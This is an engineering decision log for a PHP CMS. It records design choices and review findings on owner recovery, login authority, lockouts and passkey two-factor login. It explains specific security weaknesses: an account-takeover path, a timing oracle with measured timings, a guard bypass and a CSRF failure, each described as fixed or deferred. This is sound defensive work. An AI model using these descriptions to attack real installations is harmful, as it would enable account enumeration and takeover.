  - **They disagreed about `post_type.updatable_fields`, and the auditor was right.** The `code-reviewer` called the absence of a reserved-key denylist a real gap, on the grounds that `list()` and `getMenuItems()` "trust `$pt['builtin']` as authoritative". The `security-auditor` returned **no finding** on the same code, having traced that the storage key is the `$id` **parameter** and never `$postType['id']`, and that `delete()`'s protection compares `$id === self::BUILTIN_PAGE` rather than reading the record. Re-derived myself rather than picking a side (L-013): `$pt['builtin']` is read in exactly two places, `:232-233` (sort order) and `:1571` (menu display). **Both cosmetic. The auditor is right and the reviewer overstated it.** The `array_diff( $updatable, [ 'id', 'builtin', 'created_at' ] )` guard is kept anyway and is described honestly as **defence in depth, not a vulnerability fix**: `id` diverging from its own storage key is an integrity hazard whatever currently reads it, and a field that is cosmetic today is one requirement away from not being. Pinned by a test proven to fail against the un-guarded code, with a positive control in the same test so it cannot pass by the filter simply not running.
  - **The `security-auditor` found the interlock test was scanning the wrong half of the risk, and that is the finding of the cycle.** `testCoreItselfRegistersNoByReferenceListener` scanned `installer/core/` only. But `installer/admin/bootstrap.php` registers **five** hooks at top level, is required by every admin page and endpoint, and sits outside PluginLoader's catch **and** outside its own two try/catch blocks, which close well above those registrations — and **no test boots it at all**, because `IntegrationTestCase` calls `App::boot()` directly. So a by-reference listener added there would have been caught by nothing until a real admin request hit it, which is strictly worse than the core case the test was written for. The scan now covers `installer/core/` **and** `installer/admin/`, proven by planting an offender in `admin/` (the old scan missed it entirely) and watching it go quiet on removal.
  - **The `code-reviewer` found the scan's own comment was false.** It claimed to "over-match rather than under-match"; it could in fact under-match — a direct `Hooks::addAction()` call, an arrow function, or a closure assigned to a variable first. The pattern now matches both spellings and both function forms, **proven against nine cases** (six that must match including multi-line signatures, three that must not, including `use ( &$x )` capture). The remaining gap — a callback assigned to a variable before registration — is now **stated in the docblock** rather than denied, together with why it is acceptable: this is the second line of defence, and `refuseByReferenceCallback()` catches every spelling at runtime.
  - **A check that scanned nothing would have reported PASS.** Added a floor assertion on the file count with the message *"it has not passed, it did not run"* — keel-verify's placeholder check shipped with exactly this hole (L-016).
  - **The exception message carried an ABSOLUTE path, breaking this file's own neighbouring convention.** The message travels: a plugin tripping the refusal fails to load, and `PluginLoader::loadErrors` surfaces the text on the admin plugins page and through `klytos_list_plugins`. Both are gated at `plugins.manage`, so no boundary is crossed — but `plugin-loader.php:220` deliberately uses `basename()` for its sibling error two lines from where this one lands. The message now carries the basename; the absolute path stays available, structured, through `getCallbackLocation()`.
  - **`page.save_data` runs after sanitization and nothing re-checks it** — `buildPageData()` sanitizes `content_html` and validates `status` *before* the filter, and the returned value is written straight to storage. The auditor traced every caller and confirmed **no unauthenticated or lower-privileged path was newly exposed** (`autosave.php` at `pages.edit`; the MCP tools at `pages.create`/`pages.edit`; nothing in `installer/public/`), and that a plugin already has equivalent power through `StorageInterface::write()`. So it is not a new trust boundary — but `docs/reference/hooks.md` now says outright that a filter touching `content_html` must re-run `klytos_kses_post()`, that `status` must not become scheduled without a valid `publish_at`, and that `slug` is the storage key. Writing "modify freely" would have been the L-002 defect in a document written to prevent it.
  - **One finding was STALE rather than wrong** — the auditor reported the `post_types`/`post-types` collection typo in the test's `tearDown`, which had already been fixed from the `code-reviewer`'s earlier report of the same line. L-015's other half: an accusation can be true of the moment it was read and false of the moment it lands.
  - **Both reviewers again ran without a shell** and said so unprompted. The limit is recorded rather than glossed: neither could execute `phpunit`, `phpcs` or `git diff`, so every count in this decision rests on measurements taken in the main session. Where they could verify by reading — the reflection logic across all callable shapes, `use ( &$x )` being unaffected, the filter/action ordering in both `PageManager` methods, the x402 early-return semantics, the absence of any first-party `set_exception_handler()` — they did, and those conclusions are theirs.

## D-055 — Owner recovery is a CLI command that works without a session; refusals exit non-zero
- Date / phase: 2026-07-25 / Phase 5, Sprint 4 slice 2 (the sprint scope and the NEW-33 boundary were user decisions taken before anything was written)
- Decision: `owner:repair --email=<address>` is added to `TerminalExecutor`, declaring `users.manage`. It writes the missing `admin_email` into config and then runs the product's **own** `UserManager::migrateFromV1Config()`, which rebuilds the owner record from `config['admin_user']` and `config['admin_pass_hash']`. The operator's existing password still applies; the command sets no credentials. It refuses — naming the existing owner — when one already exists, refuses with its usage line when `--email` is missing or invalid, and refuses when config retains no admin credentials to restore from. Closes audit **NEW-08**. *(This is the CORRECTED design; the first implementation took `--username`/`--password` and was refuted in review — see the amendment at the end of this entry.)*
- **Why the CLI, and why the permission looks like it does nothing.** Recovery must work with **no session**, which rules out the admin panel by construction — that is the whole defect. Verified against source rather than assumed: `TerminalExecutor::dispatch()` performs **no** permission check (the checks live only in the web wrapper at `:225-229`), and `installer/cli.php` calls `dispatch()` directly. That asymmetry is deliberate and pre-existing — reaching the CLI already means holding filesystem access to the installation, which is strictly more power than any account has. The declared `users.manage` is what gates the command in the **web** terminal, where a session exists and a role is meaningful. So the permission is not decoration and it is not a hole; it governs the one transport where it can.
- **Refusals THROW rather than return, and that is a correctness property, not a style choice.** `dispatch()` reports `success => true` for any handler that returns without throwing, and `cli.php` derives its **exit code** from that field. A refusal returned as a string would therefore have exited **0** — telling an automated recovery script that a repair which changed nothing had succeeded. Found by a test asserting `success === false`, not by reading.
- **Uniqueness stays structural.** `migrateFromV1Config()` returns the existing owner untouched when one is present, so the command cannot mint a second. The `findOwner()` check in the command is not a second guard — it exists so the refusal can **name** the current owner, which is the one fact an operator locked out of an install needs.
- **Two of the five tests initially passed against the unfixed tree for the WRONG reason**, and that is the transferable part: an unknown command also makes `dispatch()` report failure, so `assertFalse( $result['success'] )` held before the command existed. Tightened to assert the refusal's **reason** — the message must name the existing owner, or name the missing flag, and must NOT be the "unknown command" text. **L-012's rule** (assert the reason, not just the outcome) applied to a command surface.
- **The recreated owner is proven to AUTHENTICATE, not merely to exist.** Recreating a record is not the same as restoring access — if the password were stored wrong the record would look perfect and the operator would still be locked out. The test authenticates with the right password and asserts the wrong one fails, so the positive control cannot pass vacuously (L-014, L-010).
- **NEW-33 is deliberately NOT closed here, by explicit user decision.** This slice touches `terminal-executor.php`, which fires NEW-33's recorded trigger ("the next slice touching `terminal-executor.php`"). The file carries **14** hardcoded Spanish strings against D-006's English-base rule. Converting them means ~14 keys × 20 locales, each of which must satisfy the orthography contract, and that is a coherent i18n slice with its own test point rather than a rider on a recovery command — the tangling D-025, D-026, D-029 and D-031 each refused in turn. The trigger is re-bound to **the next slice touching that file, or a dedicated i18n slice**, whichever comes first.
- **The visible cost of that boundary, stated rather than discovered later:** this command's four strings ARE English catalogue keys in all 20 locales (D-006 is not optional for new strings), so `help` now lists 25 Spanish command descriptions and one translated one. A real, temporary inconsistency that NEW-33's closure removes. Recording it so the next reader does not file it as a fresh defect.
- **`__()` resolves on this path — proven, not assumed.** NEW-18 records that the *global* `__()` is declared only under `admin/`, while `app.php` declares a **namespaced** one; `terminal-executor.php` is in `Klytos\Core`, so resolution follows the namespace of the file where the call is written (the D-053 finding). Proven by the tests asserting on `--email` and on the substituted username, neither of which appears in the catalogue KEYS — so a miss, which returns the key verbatim, would have failed them.
- Alternatives rejected (and why): **an admin page** (cannot work — the state it recovers from is precisely one where no login can succeed); **repair during boot, automatically** (silently creating an owner with generated credentials on a damaged install is a privilege-granting side effect nobody asked for, and it would mask the underlying config fault D-031 deliberately made visible); **also resetting an existing owner's password** (a different operation with different consequences, and the command would then need to distinguish "recover" from "take over" — left unbuilt and named in the reference doc); **a `--force` flag to replace an existing owner** (rejected outright: an unauthenticated CLI path that can replace the owner of a working install is a worse primitive than the problem).
- Supersedes: none. Closes audit **NEW-08**; discharges the half of D-031 that was left explicitly open ("It does not restore access").
- **AMENDMENT (2026-07-25, before commit — the slice's own `code-reviewer` returned a BLOCKING finding that was correct and redesigned this command).** Recorded in full because the defect is the exact one this project keeps writing lessons about.
  - **The first implementation created a record nobody could log in as.** It took `--username`, `--email` and `--password`, and called `UserManager::create()`. But `Auth::login()` — the admin panel's real gate — validates the username against `config['admin_user']` and the password against **`config['admin_pass_hash']`**, never against the user record (that is NEW-11, which this slice's own reference doc had already written down three paragraphs below its headline claim). So the supplied password could never log anyone in; and once `findOwner()` returned non-null, the command **refused to run again**, leaving the install permanently unrecoverable through the product. The reviewer's phrase for it is exact: verified against the failure mode its author modelled, not against the end-to-end path it exists to restore.
  - **My own test hid it, and it is the test I had written invoking L-014.** `testTheRecreatedOwnerCanActuallyAuthenticate` asserted `UserManager::authenticate()` — the manager — not `Auth::login()` — the gate. It passed against a command that restored nothing. Writing "recreating a record is not the same as restoring access" in a docblock and then testing the wrong layer is L-014 quoted and disobeyed in the same file.
  - **The corrected design follows from what actually breaks** (verified: `upgrade-assert.php:131` removes **only** `admin_email`; `admin_user` and `admin_pass_hash` survive). The missing piece is the **email**, not the identity — so the command supplies it and runs the existing migration. That also satisfies the no-duplication rule: there is now still exactly one code path that creates an owner from config, rather than a second one beside it. **User decision**, taken on the corrected shape before it was written.
  - **The alternative was rejected on security grounds, not effort:** also writing `config['admin_pass_hash']` would make the supplied password real and would recover an install whose config password is lost too — at the cost of an unauthenticated CLI primitive that resets the owner password on any install. If that is ever wanted it belongs in a separately-named command, not hidden inside "repair".
  - **The test now drives the REAL gate**, `Auth::login()`, with the wrong password asserted first (it returns before touching the session, so that half needs no session and cannot be the only thing observed) and the right one second, under a real `session_start()` — the one place this tier deliberately deviates from its own design, stated in the test rather than left to be discovered.
  - **D-039's config guard fired on the new tests and was right.** The repair writes `config.json.enc`, and `App::$config` is decrypted once at boot with no invalidation path, so a later test would read a stale value and pass for the wrong reason. `#[RunInSeparateProcess]` did **not** silence it (the guard detects the mutation, not the staleness). Resolved by having the tests pass the email config **already holds**, making the write net-zero: the command still takes the same branch, still writes the file, still runs the migration, and the bytes come back identical. Suppressing the guard for this file was rejected — the whole tier depends on it.
  - **The `security-auditor` returned a separate BLOCKING finding on the FIRST design, and its fix was kept even though the redesign made it moot.** `execute()` persisted the typed command into the `terminal` storage collection — **absent from `ENCRYPTED_PATHS` at every level**, so plaintext on disk — and into the audit log, and echoed it back to the browser. `admin/logs.php` is gated at `site.configure`, which resolves to owner **and admin**, so an admin could have read the owner's password out of the log. Verified link by link. The command no longer takes a password, so the finding no longer applies to it — but the weakness is real and now known, so a `redactSecrets()` pass was added in `execute()`, at the one place every command's text is persisted, masking `--password`/`--secret`/`--token`/`--key` values before history, log or response see them. Fixing the mechanism rather than the one command is the S-07 inversion; a future command taking a `--token` is safe without its author remembering anything.
  - **Recorded and NOT fixed**, each verified: a bare `--username` (no `=value`) becomes the literal string `'true'` in `cli.php`'s parser — pre-existing, shared by every command, and no longer reachable here since the command takes no username; `findOwner()` and the migration's write are not atomic, so two concurrent repairs could race (same trust boundary as the filesystem access the CLI already assumes — now stated in the reference doc); and the password-as-a-flag exposure in shell history and `ps`, which the redesign removes entirely by not taking one.
  - **Confirmed sound by both reviewers against source:** the exit-code mapping (throw → `success:false` → exit 1; return → exit 0) with no no-op-exits-0 path; `UserManager::create()`'s bcrypt cost-12 hashing and single `LOCK_EX` write; the refusal-reason assertions correctly guarding the "unknown command also fails" trap (L-012); playground cleanliness under D-030/D-039/D-042; and all four — now five — catalogue keys structurally identical across the 20 locales with `{username}` spelled the same and the orthography correct in every accented language, checked individually.

## D-056 — The user RECORD is the sole login authority; the v1 config credential survives only as the seed
- Date / phase: 2026-07-25 / Phase 5, Sprint 5 kickoff (user decision, taken before anything was written)
- Decision: `Auth::login()` (`installer/core/auth.php:83`) stops verifying credentials against `config['admin_user']` / `config['admin_pass_hash']` and delegates to the already-implemented `UserManager::authenticate()` (`user-manager.php:384`). After this slice there is **exactly one** authority for "is this username and password valid": the user record. `config['admin_user']` and `config['admin_pass_hash']` remain in config, but only in the role they already have elsewhere in the product — the **seed** that `UserManager::migrateFromV1Config()` and `owner:repair` (D-055) rebuild a missing owner record *from*. Nothing reads them to grant access again.
- **Why a fallback was rejected, and this is the load-bearing part.** The obvious shape is record-first, config-fallback: try `UserManager::authenticate()`, and if it fails, try the old config comparison. It looks strictly safer for an installed base and it is not, for a measured reason. **Verified live this session with a net-zero probe** (the password was changed and restored inside one run):
  ```
  UserManager::changePassword( owner, NEW )
  UserManager::authenticate( owner, NEW ) -> ACCEPTED   the record updated
  Auth::login( owner, NEW )               -> REFUSED    the change never reached the gate
  Auth::login( owner, OLD )               -> ACCEPTED   the old password still works
  ```
  The two authorities have **already diverged in the product** — `changePassword()` (`user-manager.php:424`) writes `pass_hash` on the record and nothing writes `config['admin_pass_hash']` — so a config fallback does not preserve a working path, it preserves the **defect**: the old password would go on being accepted forever, in the branch nobody looks at, on the only account that can log in. Recorded separately as audit **NEW-37**.
- **What the installed base actually depends on, checked rather than assumed:** `App::boot()` Step 10b runs `migrateFromV1Config()` idempotently (D-021/D-031), which builds the owner record **from those same config values**, so an upgraded v1 install already carries a record whose `pass_hash` is the operator's current password. The upgrade path is therefore not a new dependency introduced here — it is the dependency D-021 already built and `scripts/dev/upgrade-test.sh` already exercises from the real v0.30.1. That test becomes load-bearing in a new way this sprint: it now proves *login*, not merely *boot*.
- **The residual risk, stated plainly rather than discovered later:** an install whose owner record is missing loses login entirely, where today it logs in and is then denied everywhere by the gate. That is a narrower failure than it sounds — the boot migration recreates the record, and `owner:repair --email=` (D-055) restores it from the CLI with no session, which is exactly the state it was built for. The two sprints compose; the upgrade test is what proves they do.
- Alternatives rejected (and why): **record-first with config fallback** (no upgrade risk at all, and it keeps two authorities forever — the rotation defect survives inside the fallback branch, and a defect that only fires in a fallback is the hardest kind to ever remove); **config-first with record fallback** (the current behaviour plus a widening — the stale config password would keep winning, which is the exact bug); **migrate `admin_pass_hash` on every password change so both stay in sync** (preserves both authorities honestly, but it writes a bcrypt hash of the live credential into core config for every account, and S-04's whole lesson is that two copies of one decision drift — here they would drift into an *authentication* bypass).
- Supersedes: none. Closes audit **NEW-11** and, in the same slice, **NEW-37**. Depends on D-021's boot migration and composes with D-055.
- **Implementation note 1 (slice 1) — the application-password credential now fails one layer EARLIER, which is a spec correction and not a test fix.** `validateAppPassword()` used to accept any credential whose username equalled `config['admin_user']`; it now requires the username to resolve to an **active** user record. The existing `McpActorResolutionTest::testAValidCredentialWhoseUserIsGoneResolvesToNoActor` pinned the old mechanism in its *precondition* — *"validateAppPassword() still accepts the credential; the store just can no longer attribute the caller to a role"* — so it went red the moment the delegation landed. The **property** that test exists for is unchanged and is now satisfied more strictly: a credential the store cannot attribute **denies**, and it denies at authentication (HTTP 401) instead of at the authorization gate (HTTP 403, via D-046's null-role deny). Both fail closed; the layer moved. The test was **corrected, never weakened** — it now asserts `validate()` is false AND `getActor()` is null, so it still fails if an orphan credential were ever to authenticate, and it fails in a second way if one were ever to carry an actor. Recorded here first, then changed, per Phase 5's "a wrong test is a spec correction".
- **Implementation note 2 (slice 1) — the lockout is keyed by the SUBMITTED username, not by the resolved account, and that is a deliberate departure from the approved plan.** The plan said "key it per resolved account, with one shared bucket for usernames that do not resolve", and argued no existence oracle appears because both cases answer with the same strings. **The strings are not where the oracle would be.** With a shared bucket for unresolvable names, an attacker fills it with garbage and then reads the *bucket* — a target that answers `login_failed` has its own bucket and therefore exists; one that answers `account_locked` shares the garbage bucket and therefore does not. Keying on `hash( 'sha256', $username )` removes the distinction entirely: every submitted string gets its own bucket whether or not it resolves, and no resolution happens before the lockout check at all. L-014's rule decided it — the acceptance criterion ("no existence oracle") is the requirement, the plan's shape was a guess. Case is deliberately not normalised, because `authenticate()` compares usernames exactly, so attempts under another spelling can never succeed anyway.
- **Implementation note 3 (slice 1) — one file, pruned on write, rather than one file per account.** The old implementation wrote `sys_get_temp_dir() . '/klytos_lockout_' . md5( … ) . '.json'`, one file per key. Per-username keying would have turned that into unbounded file creation from invented usernames — the **NEW-19** shape (a limiter whose identifier set grows monotonically), reproduced in a second subsystem. The map lives in ONE file under the install's `data/` directory, reached through `StorageInterface::getDataDir()` (already on the interface, already used by `ActionScheduler` and `CronManager`, so no new dependency and no App-singleton coupling), and expired entries are dropped on every write. **`MCP\RateLimiter` was assessed for reuse and rejected on the record**, per the reuse rule: its window is a hardcoded 60 seconds and its auth-failure threshold a hardcoded 10, both IP-keyed — expressing "5 attempts, 15-minute lockout, per account" through it would mean changing those constants for the MCP surface too, i.e. weakening a shipped control to avoid writing thirty lines. The 5/15 semantics and the `account_locked:{minutes}` contract the login form renders are preserved exactly; only the key and the location change.
- **Review amendment (2026-07-25, before commit — L-015): both subagents ran on the finished diff, docs included. The `code-reviewer` returned ONE BLOCKING finding, it was correct, and it was my own guard defeating itself.** Recorded in full because the shape is the transferable part.
  - **BLOCKING, and right: the owner-suspend guard was bypassable in a single call.** `update()` iterates `$updatable` in order — `role` sits **before** `status` — and assigns `$user[$field] = $data[$field]` inside the same loop. So `update( $ownerId, [ 'role' => 'admin', 'status' => 'suspended' ] )` had already overwritten `$user['role']` with `'admin'` by the time my guard read it: the owner was demoted **and** suspended in one call, straight through the check written to prevent exactly that. Reachable owner-only, including over MCP through `klytos_update_user`, which passes both fields as independent parameters. **Re-derived against source before acting** (L-013/L-015) rather than taken on the reviewer's word — it reproduces exactly as described. Fixed by comparing against `$oldRole`, which the method already captures at the top for the role-change hook; pinned by `testTheOwnerCannotBeSuspendedByDemotingInTheSameCall`, proven to fail against the pre-fix tree.
  - **A second guard was added in the same place, from the auditor's finding 5:** nothing stopped an owner **demoting themselves**, leaving an install with **no owner** — the state D-031 contains and D-055 exists to repair. `update()` now refuses to remove the owner role, mirroring its own pre-existing refusal to grant it, so `transferOwnership()` is the single supported path and the "exactly one owner" invariant this class documents at the top of its file holds at every point.
  - **The honest nuance nobody had checked:** the combined-call bypass produced a **recoverable** install (zero owners → `findOwner()` null → `owner:repair` proceeds), while the single-field suspend my guard blocks produces the **unrecoverable** one (a suspended owner exists → `owner:repair` refuses). The guard was therefore covering the worse case by luck rather than by design, and it is now correct in both spellings.
  - **NEW-39 — the login form was an account-status oracle by TIMING, and it is fixed in path.** `authenticate()` returned early for an unknown username and for a non-active account, so only *"exists and is active"* reached `password_verify()`. **Measured before fixing** (median of 12): **218.98 ms** for an active account with a wrong password against **0.65 ms** suspended and **0.64 ms** non-existent — 340×, one probe per candidate, and the per-account lockout does not mitigate it because enumeration never needs five tries. Pre-existing code, but the exposure is this slice's: until D-056 the method was only reachable from re-authentication behind an existing session. It also made this slice's own new reference doc assert "Nothing in the response distinguishes them", which is the **L-002** defect. Every outcome now performs one bcrypt verify, against another stored record's hash — a real hash rather than a committed literal, so the cost matches exactly, no bcrypt string enters the repository, and there is no first-call-in-the-process outlier, which under `php -S` would have **inverted** the oracle rather than closing it. Re-measured after: **217.55 / 219.13 / 218.05 ms**.
  - **The two reviewers described NEW-39 differently and one of them was wrong — L-023 again.** The `code-reviewer` framed it as "no bcrypt when the username matches no record", which omits the suspended case entirely; the `security-auditor` framed it as *active* versus *suspended-or-nonexistent*, which is what the code does. Settled by measuring rather than by preferring the more plausible report — and the measurement is what turned a plausible-sounding note into a 340× number worth acting on.
  - **Recorded and NOT fixed, each with a trigger: NEW-40** (the lockout's read-modify-write is not atomic and nothing throttles the login endpoint — the NEW-20 shape in a second subsystem, with `ActionScheduler::acquireLock()` named as the fix shape) and **NEW-41** (a suspended user's OAuth access token keeps working for up to an hour — the one credential type where suspension does not take effect, now stated in `authentication.md`'s suspension table rather than implied away).
  - **Three smaller corrections, all mine:** the `$userManager` docblock cited "Step 10a" for Auth's construction when `app.php` creates it at **Step 7** (the ordering claim was right, the label was invented); `mcp-authorization.md`'s credential table still read *"pinned to the admin user"* for application passwords, four lines above the prose explaining that D-056 removed the pin; and the new `upgrade-assert.php` checks were worded so that a **passing** run printed *"the upgraded owner CANNOT LOG IN"* — `check()` prints its message on PASS, so the first draft asserted falsehoods on success, the L-002 defect in a test's own output.
  - **Confirmed sound by both reviewers against source, not merely read:** no remaining path authenticates against `config['admin_user']`/`admin_pass_hash` (every surviving hit is the seed — `migrateFromV1Config`, `owner:repair`, `install.php` — or a comment describing it); `resolveUserId()` is fully deleted with zero remaining references; every caller of `login()` and `validateAppPassword()` was enumerated and is consistent with the new authority; the lockout key cannot reach a filename or a JSON key (it is hashed); `data/` is not served over HTTP; usernames cannot be changed after creation, so a credential cannot be re-pointed at another account; and every new test asserts through `Auth::login()` rather than the manager (L-024 respected).
  - **Both reviewers ran without a shell and said so unprompted.** The limit is recorded rather than glossed: neither could execute `git diff`, `phpunit` or a timing measurement, so their conclusions rest on reading, and every number in this amendment was measured in the main session.
- **Implementation note 4 (slice 1) — a private near-duplicate was deleted, and NEW-29 was fixed in path.** `Auth::resolveUserId()` was a second implementation of `UserManager::getByUsername()`, and its only caller was the config comparison this decision removes (private, one call site, zero references in tests — verified repo-wide before deleting, per L-007). And `validateAppPassword()`'s `foreach ( $data['passwords'] ?? [] as &$stored )` — audit **NEW-29**, the L-017 footgun, which has silently discarded every `last_used` update the method ever made — is fixed here rather than deferred again: this slice rewrites that method, so D-031's narrowing applies to it exactly as it did to the four defects D-033 fixed in path.

## D-057 — Sprint 5 scope: NEW-09 rides along; NEW-26, NEW-32 and NEW-13 do not
- Date / phase: 2026-07-25 / Phase 5, Sprint 5 kickoff (user decision, taken before anything was written)
- Decision: Sprint 5 carries **NEW-11** (slice 1) and **NEW-09** (slice 2, passkey second-factor login). **NEW-26** (the password-reset form has no CSRF), **NEW-32** (the authorization audit hooks reach no sink) and **NEW-13** (the identity export has no re-auth, no 2FA and no owner notification) are **not** in scope, each keeps the trigger it already carries, and each is named as out of scope in `docs/sprints/sprint-5.md` rather than left implicit.
- **Why NEW-09 belongs here and the other three do not.** NEW-09 is the same subsystem, and D-036 bound it to this slice by name — its fix shape is already written down, and its forbidden one-liner (`$preAuthScripts`) becomes *safe* only once slice 2's restrictions exist, so doing it anywhere else means either shipping a takeover primitive or re-deriving the whole analysis. The other three are adjacent surfaces that merely *touch* authentication: NEW-26 is a CSRF field on a form, NEW-32 is a logging design with real volume and content decisions (D-031's narrowing applies — it is a different subsystem), and NEW-13 adds re-authentication, a second-factor prompt and a mail dependency to the identity export, which D-040 already refused to fold into a slice for exactly this reason.
- **Why naming them explicitly is part of the decision, not bookkeeping:** an unnamed exclusion reads as an oversight to the next reader, and this project has twice had a reviewer re-raise something that was a recorded decision (`.cursor/agents/`, the inner-paren style). Naming them costs three lines and removes a whole class of re-litigation.
- Alternatives rejected (and why): **NEW-11 alone, NEW-09 in its own sprint** (a smaller, cleaner sprint — but slice 1 makes 2FA reachable for three more roles, so shipping it while passkey login is known-broken widens a broken flow deliberately); **add NEW-26** (genuinely small, and it is on `reset-password.php`, a file slice 1 must already re-read — but the exploitability is low by its own recorded assessment and it is not required by any acceptance criterion here); **add NEW-32** (attractive because this sprint produces exactly the refusals nobody can currently read — and that is an argument for a logging slice, not for a rider on an authentication one).
- Supersedes: none. Bounds the sprint recorded in `docs/sprints/sprint-5.md`.

## D-058 — Passkey second-factor login is completed in the order that makes D-036's exemption safe, and the pre-auth list stops being keyed by basename
- Date / phase: 2026-07-25 / Phase 5, Sprint 5 slice 2
- Decision: audit **NEW-09** is closed in four steps, in this order and no other: **(1)** `admin/api/webauthn-challenge.php` restricts `register_challenge` and `register_complete` to **fully authenticated** callers, leaving only `auth_challenge` reachable while 2FA is pending; **(2)** `admin/login.php`'s 2FA dispatcher gains the `passkey` branch, wired to the already-complete `TwoFactor::verifyPasskeyAssertion()`; **(3)** enrolling an authenticator emails the account holder (`TwoFactor::sendPasskeyEnrolledEmail()`) and fires a new `user.passkey_enrolled` action; **(4)** **only then** does `api/webauthn-challenge.php` join `$preAuthScripts` in `admin/bootstrap.php`. Step 4 was the last line written in the slice.
- **Why the order is the decision and not a detail.** D-036 recorded that step 4 alone — the one-line fix this project has called FORBIDDEN for four sprints — is a full account-takeover primitive: `is2faPending()` is true after a correct **password alone**, and `completePasskeyRegistration()` enrols a credential and sets `enabled = true` **without checking any existing factor**. Verified against source again in this slice rather than taken from the record: both facts still hold exactly. Step 1 is what removes the primitive; every other step is inert without it. `PasskeyLoginTest::testRegistrationIsRefusedWhileTwoFactorIsMerelyPending` is therefore not a nice-to-have — it is the standing proof that step 4 is still safe, and it is written so it fails if step 1 is ever relaxed.
- **The D-043 question, asked before acting and answered in writing:** what does an ANONYMOUS caller now reach? Nothing new. `admin/bootstrap.php` runs the cron manager and the action scheduler **above** the auth guard, so they already execute for every anonymous request to `login.php`, `logout.php` and `reset-password.php`; a fourth entry adds no capability that the first three did not already offer. The endpoint's own check still answers **401** to a caller with neither a session nor a pending challenge. This is the question D-036 recorded as unasked the first time; asking it changed nothing here, which is itself the answer rather than a formality.
- **A second-order defect was found while adding the entry, and fixing it is part of this decision.** `$preAuthScripts` was matched against `basename( $_SERVER['SCRIPT_NAME'] )`. **Six** filenames exist in both `admin/` and `admin/api/` — `ai-chat`, `logs`, `plugins`, `tasks`, `terminal`, `translations` — which is precisely the collision **D-032** keyed the gate map by *path* to avoid, and this list had inherited the weaker scheme because until now every entry was top-level. Adding the first `api/` entry is what made it matter. The list now matches `klytos_admin_gate_key()` — the existing, tested helper, resolving from `SCRIPT_FILENAME` rather than the URL, returning **null** for anything outside `admin/`, which matches nothing and therefore requires authentication (fail-closed). Reused rather than reinvented, and nothing was exploitable: `webauthn-challenge.php` is unique repo-wide. The mechanism was one same-named file away from being.
- **`Helpers::webauthnRpId()` exists so the rpId is derived once.** A passkey is bound to the Relying Party ID it was registered under, so registration and verification must derive it identically; a one-character divergence invalidates every stored credential and presents as a broken authenticator rather than a broken string. The endpoint and the login page now read the same function. The port is stripped because the spec's rpId is a domain, never an origin — `localhost:8083` is not a valid rpId, which is the case every local playground hits.
- **The notification is an action AND a mail, and neither can fail the enrolment.** The credential is already stored by the time both run, so a mail failure must not report an error the storage layer disagrees with; `sendPasskeyEnrolledEmail()` catches and logs. Nothing in core subscribes to `user.passkey_enrolled`, and `docs/reference/authentication.md` says so in those words — **L-019** was recorded because "it goes to the audit log" was true of a hook and false of the system.
- **Proven without a browser, and that is the part worth keeping.** The tests generate a P-256 key with `openssl_pkey_new`, hand-encode the COSE public key and the CBOR attestation object, and produce a real ES256 signature over `authData || SHA-256( clientDataJSON )`. The credential is enrolled through the product's **own** `completePasskeyRegistration()` rather than written into storage (**L-005**: a fixture that bypasses the application proves only that the fixture works), so registration and login are proven to compose. A tampered-signature test exists so the passing case cannot be passing because the dispatcher accepts anything assertion-shaped. All four were observed FAILING before step 4 landed (L-016).
- **Correction of record:** audit NEW-09 says the endpoint "gates all **four** of its actions" on the weak condition. There are **three** plus an unknown-action branch. Re-counted against source (L-015); the substance is unchanged, since two of the three were the dangerous pair.
- Alternatives rejected (and why): **step 4 alone** (the forbidden one-liner — it is the takeover primitive, and it buys nothing besides, because passkey login could not complete regardless); **requiring an existing second factor before enrolment** (correct, and it is step-up authentication — a different subsystem with its own test point, recorded as **NEW-13** and explicitly out of scope per D-057; the enrolment email is the compensating control and is named as such rather than sold as equivalent); **keeping the basename match and adding `'webauthn-challenge.php'`** (smallest diff, works today, and leaves a list where a second file of the same name is silently exempt — the by-omission shape S-07, NEW-02 and the tool loader were each closed to eliminate); **a browser-driven end-to-end test** (proves the real UI, needs a virtual authenticator and a browser in CI, and would not have caught anything these tests miss on the server side).
- Supersedes: none. Closes audit **NEW-09**; discharges **D-036**'s deferral at the trigger D-036 itself named.
- **Review amendment (2026-07-25, before commit — L-015): BOTH subagents returned a BLOCKING finding, both were correct, and the `security-auditor`'s is the most valuable single finding of this sprint — it proved this slice had NOT closed NEW-09 at all.**
  - **BLOCKING 1 — the feature did not work in a browser, and the test suite was green because the harness was fixing the product.** `login.php`'s and `security.php`'s `fetch()` calls send `Content-Type: application/json` and put the CSRF token INSIDE the JSON body. `Helpers::verifyCsrf()` reads `$_POST['csrf']`, `$_SERVER['HTTP_X_CSRF_TOKEN']` and `$_GET['csrf']` — and **PHP does not populate `$_POST` for a JSON body**, so the token was invisible and the endpoint answered **403** to every real browser call. Passkey registration AND passkey login were therefore unreachable for any actual user, on top of the two defects NEW-09 already named. Every test passed because `AdminHttpTestCase::postJson()` adds an `X-CSRF-Token` header — **a header the shipped page never sends** — and its own docblock explains why, i.e. the harness had the diagnosis written into it as a workaround while the product carried the bug. **Reproduced by running, not by reading**: a request built with exactly the shipped page's headers returned `403 {"error":"Invalid CSRF token"}`. This is **L-016's shape one turn further out** — not a measurement that goes green without observing anything, but a harness that quietly repairs the thing it is measuring.
  - The tell had been sitting in the file the whole time: `$csrf = $input['csrf'] ?? '';` was read into a variable and **never used**. It is used now. Fixed on both sides deliberately rather than either: the endpoint accepts the body token (via the existing `Auth::validateCsrf()`) **and** all three `fetch()` calls now send `X-CSRF-Token` like every sibling admin page — so neither a future JS change nor a future helper change can silently break it again. Pinned by `testTheEndpointAcceptsTheTokenTheShippedPageActuallySends`, which builds its request by hand *without* the header, is the only test here that reproduces the shipped page byte for byte, and was **observed failing first**.
  - **This decision's own "alternatives rejected" was wrong and is corrected rather than quietly dropped.** It said a browser-driven end-to-end test "would not have caught anything these tests miss on the server side". That is false: any faithful client — a browser, or the hand-built request now in the suite — catches this immediately. The claim was reasoning about the transport instead of exercising it.
  - **BLOCKING 2 (`code-reviewer`), also correct: the enrolment notification could report a stored credential as a failure.** `klytos_do_action( 'user.passkey_enrolled', … )` sat inside the same `try { } catch ( \RuntimeException )` as `completePasskeyRegistration()`, and `Hooks::doAction()` has no per-listener guard — so a plugin throwing `RuntimeException` would have produced `{"success": false}` and HTTP 400 for an enrolment that had already been persisted, and anything else it threw would have escaped uncaught. The comment beside it claimed "neither can fail the enrolment", which was true of the mail (it catches internally) and false of the action — this decision's own text, contradicted by its own code. The success response is now sent **before** the notification block, and that block has its own `catch ( \Throwable )`.
